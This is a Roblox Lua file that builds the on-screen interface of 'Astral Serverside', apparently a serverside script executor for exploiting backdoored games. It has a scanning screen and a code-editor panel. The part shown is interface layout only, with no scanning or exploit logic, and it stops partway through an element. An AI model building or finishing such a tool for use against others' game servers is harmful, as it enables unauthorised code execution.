--astral
--by C:\Drive






































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































local G2L = {};

-- StarterGui.Astral Serverside
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 1999999999;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[Astral Serverside]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Astral Serverside.MainFrame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["ClipsDescendants"] = true;
G2L["2"]["Size"] = UDim2.new(0, 450, 0, 275);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[MainFrame]];
G2L["2"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.Corner
G2L["3"] = Instance.new("UICorner", G2L["2"]);
G2L["3"]["Name"] = [[Corner]];
G2L["3"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.Border
G2L["4"] = Instance.new("UIStroke", G2L["2"]);
G2L["4"]["Name"] = [[Border]];
G2L["4"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow
G2L["5"] = Instance.new("UIGradient", G2L["4"]);
G2L["5"]["Name"] = [[Rainbow]];
G2L["5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
G2L["6"] = Instance.new("LocalScript", G2L["5"]);
G2L["6"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.Drag
G2L["7"] = Instance.new("LocalScript", G2L["2"]);
G2L["7"]["Name"] = [[Drag]];


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame
G2L["8"] = Instance.new("Frame", G2L["2"]);
G2L["8"]["Visible"] = false;
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["ClipsDescendants"] = true;
G2L["8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Name"] = [[ScanningFrame]];
G2L["8"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Corner
G2L["9"] = Instance.new("UICorner", G2L["8"]);
G2L["9"]["Name"] = [[Corner]];
G2L["9"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Description
G2L["a"] = Instance.new("TextLabel", G2L["8"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["TextStrokeTransparency"] = 0;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextScaled"] = true;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["a"]["Size"] = UDim2.new(1, -50, 0, 125);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[The game might freeze, don't worry it's scanning though.]];
G2L["a"]["Name"] = [[Description]];
G2L["a"]["Position"] = UDim2.new(0.5, 0, 0.5, 48);


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Title
G2L["b"] = Instance.new("TextLabel", G2L["8"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["TextStrokeTransparency"] = 0;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextScaled"] = true;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Size"] = UDim2.new(1, 0, 0, 64);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Astral Serverside]];
G2L["b"]["Name"] = [[Title]];
G2L["b"]["Position"] = UDim2.new(0, 0, 0, 10);


-- StarterGui.Astral Serverside.MainFrame.ScanningHandler
G2L["c"] = Instance.new("LocalScript", G2L["2"]);
G2L["c"]["Name"] = [[ScanningHandler]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame
G2L["d"] = Instance.new("Frame", G2L["2"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["ClipsDescendants"] = true;
G2L["d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Name"] = [[ExecutionFrame]];
G2L["d"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Corner
G2L["e"] = Instance.new("UICorner", G2L["d"]);
G2L["e"]["Name"] = [[Corner]];
G2L["e"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox
G2L["f"] = Instance.new("Frame", G2L["d"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["f"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["f"]["ClipsDescendants"] = true;
G2L["f"]["Size"] = UDim2.new(1, -50, 0, 175);
G2L["f"]["Position"] = UDim2.new(0.5, 0, 0, 50);
G2L["f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["Name"] = [[FastColoredTextbox]];
G2L["f"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll
G2L["10"] = Instance.new("ScrollingFrame", G2L["f"]);
G2L["10"]["Active"] = true;
G2L["10"]["ZIndex"] = 2;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["10"]["TopImage"] = [[]];
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["10"]["Name"] = [[Scroll]];
G2L["10"]["BottomImage"] = [[]];
G2L["10"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["10"]["ScrollBarImageColor3"] = Color3.fromRGB(43, 43, 43);
G2L["10"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
G2L["10"]["ScrollBarThickness"] = 17;
G2L["10"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextBox
G2L["11"] = Instance.new("TextBox", G2L["10"]);
G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextWrapped"] = true;
G2L["11"]["TextTransparency"] = 0.75;
G2L["11"]["TextSize"] = 15;
G2L["11"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
G2L["11"]["RichText"] = true;
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["MultiLine"] = true;
G2L["11"]["ClearTextOnFocus"] = false;
G2L["11"]["Size"] = UDim2.new(10, -27, 1, 0);
G2L["11"]["Position"] = UDim2.new(0, 17, 0, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[]];
G2L["11"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Highlighting
G2L["12"] = Instance.new("TextLabel", G2L["10"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextSize"] = 15;
G2L["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["BackgroundTransparency"] = 1;
G2L["12"]["RichText"] = true;
G2L["12"]["Size"] = UDim2.new(10, -27, 1, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[]];
G2L["12"]["Name"] = [[Highlighting]];
G2L["12"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LineSelector
G2L["13"] = Instance.new("Frame", G2L["10"]);
G2L["13"]["ZIndex"] = -7;
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["13"]["Position"] = UDim2.new(0, 20, 0, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[LineSelector]];
G2L["13"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Cursor
G2L["14"] = Instance.new("Frame", G2L["10"]);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["Size"] = UDim2.new(0, 1, 0, 15);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Name"] = [[Cursor]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextMeasurer
G2L["15"] = Instance.new("TextLabel", G2L["10"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 15;
G2L["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["BackgroundTransparency"] = 1;
G2L["15"]["RichText"] = true;
G2L["15"]["Size"] = UDim2.new(10, -27, 1, 0);
G2L["15"]["Visible"] = false;
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[]];
G2L["15"]["Name"] = [[TextMeasurer]];
G2L["15"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesValue
G2L["16"] = Instance.new("NumberValue", G2L["10"]);
G2L["16"]["Name"] = [[LinesValue]];
G2L["16"]["Value"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame
G2L["17"] = Instance.new("Frame", G2L["10"]);
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Size"] = UDim2.new(0, 17, 17.91826, 0);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Name"] = [[LinesFrame]];
G2L["17"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
G2L["18"] = Instance.new("TextLabel", G2L["17"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 15;
G2L["18"]["TextScaled"] = true;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
G2L["18"]["BackgroundTransparency"] = 1;
G2L["18"]["Size"] = UDim2.new(0, 17, 0, 15);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[1]];
G2L["18"]["Name"] = [[TextLabelTemplate]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
G2L["19"] = Instance.new("UIListLayout", G2L["17"]);
G2L["19"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
G2L["1a"] = Instance.new("LocalScript", G2L["f"]);
G2L["1a"]["Name"] = [[Handler]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top
G2L["1b"] = Instance.new("Frame", G2L["f"]);
G2L["1b"]["Visible"] = false;
G2L["1b"]["ZIndex"] = 3;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
G2L["1b"]["Size"] = UDim2.new(0, 17, 0, 17);
G2L["1b"]["Position"] = UDim2.new(1, -17, 0, 0);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Name"] = [[Y_Top]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow
G2L["1c"] = Instance.new("Frame", G2L["1b"]);
G2L["1c"]["Size"] = UDim2.new(0, 16, 0, 16);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1c"]["Name"] = [[Arrow]];
G2L["1c"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
G2L["1d"] = Instance.new("Frame", G2L["1c"]);
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["1d"]["Size"] = UDim2.new(0, 7, 0, 1);
G2L["1d"]["Position"] = UDim2.new(0, 5, 0, 9);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
G2L["1e"] = Instance.new("Frame", G2L["1c"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["1e"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["1e"]["Position"] = UDim2.new(0, 6, 0, 8);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
G2L["1f"] = Instance.new("Frame", G2L["1c"]);
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["1f"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["1f"]["Position"] = UDim2.new(0, 7, 0, 7);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
G2L["20"] = Instance.new("Frame", G2L["1c"]);
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["20"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["20"]["Position"] = UDim2.new(0, 8, 0, 6);
G2L["20"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["20"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Button
G2L["21"] = Instance.new("TextButton", G2L["1b"]);
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["TextSize"] = 14;
G2L["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["BackgroundTransparency"] = 1;
G2L["21"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[]];
G2L["21"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm
G2L["22"] = Instance.new("Frame", G2L["f"]);
G2L["22"]["Visible"] = false;
G2L["22"]["ZIndex"] = 3;
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
G2L["22"]["Size"] = UDim2.new(0, 17, 0, 17);
G2L["22"]["Position"] = UDim2.new(1, -17, 1, -17);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Name"] = [[Y_Btm]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Button
G2L["23"] = Instance.new("TextButton", G2L["22"]);
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["BackgroundTransparency"] = 1;
G2L["23"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Text"] = [[]];
G2L["23"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow
G2L["24"] = Instance.new("Frame", G2L["22"]);
G2L["24"]["Size"] = UDim2.new(0, 16, 0, 16);
G2L["24"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["24"]["Name"] = [[Arrow]];
G2L["24"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
G2L["25"] = Instance.new("Frame", G2L["24"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["25"]["Size"] = UDim2.new(0, 7, 0, 1);
G2L["25"]["Position"] = UDim2.new(0, 5, 0, 7);
G2L["25"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["25"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
G2L["26"] = Instance.new("Frame", G2L["24"]);
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["26"]["Size"] = UDim2.new(0, 5, 0, 1);
G2L["26"]["Position"] = UDim2.new(0, 6, 0, 8);
G2L["26"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["26"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
G2L["27"] = Instance.new("Frame", G2L["24"]);
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["27"]["Size"] = UDim2.new(0, 3, 0, 1);
G2L["27"]["Position"] = UDim2.new(0, 7, 0, 9);
G2L["27"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["27"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
G2L["28"] = Instance.new("Frame", G2L["24"]);
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["28"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["28"]["Position"] = UDim2.new(0, 8, 0, 10);
G2L["28"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["28"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft
G2L["29"] = Instance.new("Frame", G2L["f"]);
G2L["29"]["Visible"] = false;
G2L["29"]["ZIndex"] = 3;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
G2L["29"]["Size"] = UDim2.new(0, 17, 0, 17);
G2L["29"]["Position"] = UDim2.new(0, 0, 1, -17);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Name"] = [[X_Lft]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Button
G2L["2a"] = Instance.new("TextButton", G2L["29"]);
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextSize"] = 14;
G2L["2a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["BackgroundTransparency"] = 1;
G2L["2a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[]];
G2L["2a"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow
G2L["2b"] = Instance.new("Frame", G2L["29"]);
G2L["2b"]["Size"] = UDim2.new(0, 16, 0, 16);
G2L["2b"]["Name"] = [[Arrow]];
G2L["2b"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
G2L["2c"] = Instance.new("Frame", G2L["2b"]);
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["2c"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["2c"]["Position"] = UDim2.new(0, 6, 0, 8);
G2L["2c"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
G2L["2d"] = Instance.new("Frame", G2L["2b"]);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["2d"]["Size"] = UDim2.new(0, 1, 0, 3);
G2L["2d"]["Position"] = UDim2.new(0, 7, 0, 7);
G2L["2d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
G2L["2e"] = Instance.new("Frame", G2L["2b"]);
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["2e"]["Size"] = UDim2.new(0, 1, 0, 5);
G2L["2e"]["Position"] = UDim2.new(0, 8, 0, 6);
G2L["2e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
G2L["2f"] = Instance.new("Frame", G2L["2b"]);
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["2f"]["Size"] = UDim2.new(0, 1, 0, 7);
G2L["2f"]["Position"] = UDim2.new(0, 9, 0, 5);
G2L["2f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght
G2L["30"] = Instance.new("Frame", G2L["f"]);
G2L["30"]["Visible"] = false;
G2L["30"]["ZIndex"] = 3;
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
G2L["30"]["Size"] = UDim2.new(0, 17, 0, 17);
G2L["30"]["Position"] = UDim2.new(1, -18, 1, -17);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Name"] = [[X_Rght]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Button
G2L["31"] = Instance.new("TextButton", G2L["30"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextSize"] = 14;
G2L["31"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["BackgroundTransparency"] = 1;
G2L["31"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[]];
G2L["31"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow
G2L["32"] = Instance.new("Frame", G2L["30"]);
G2L["32"]["Size"] = UDim2.new(0, 16, 0, 16);
G2L["32"]["Name"] = [[Arrow]];
G2L["32"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
G2L["33"] = Instance.new("Frame", G2L["32"]);
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["33"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["33"]["Position"] = UDim2.new(0, 10, 0, 8);
G2L["33"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
G2L["34"] = Instance.new("Frame", G2L["32"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["34"]["Size"] = UDim2.new(0, 1, 0, 3);
G2L["34"]["Position"] = UDim2.new(0, 9, 0, 7);
G2L["34"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
G2L["35"] = Instance.new("Frame", G2L["32"]);
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["35"]["Size"] = UDim2.new(0, 1, 0, 5);
G2L["35"]["Position"] = UDim2.new(0, 8, 0, 6);
G2L["35"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
G2L["36"] = Instance.new("Frame", G2L["32"]);
G2L["36"]["BorderSizePixel"] = 0;
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
G2L["36"]["Size"] = UDim2.new(0, 1, 0, 7);
G2L["36"]["Position"] = UDim2.new(0, 7, 0, 5);
G2L["36"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Ground
G2L["37"] = Instance.new("Frame", G2L["f"]);
G2L["37"]["Visible"] = false;
G2L["37"]["ZIndex"] = 2;
G2L["37"]["BorderSizePixel"] = 0;
